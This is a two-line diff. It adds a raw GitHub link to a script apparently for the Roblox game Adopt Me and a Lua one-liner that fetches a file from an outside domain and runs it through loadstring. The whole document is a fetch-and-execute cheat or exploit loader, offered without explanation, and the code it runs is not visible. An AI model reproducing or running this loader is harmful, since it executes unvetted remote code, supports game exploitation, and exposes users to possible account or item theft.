@@ -1,0 +1,2 @@
+https://raw.githubusercontent.com/ToraScript/Script/main/AdoptMeWINTER
+loadstring(game:HttpGet("https://egorikusa.space/8192ae7daf4165b685f8cce1.lua", true))()
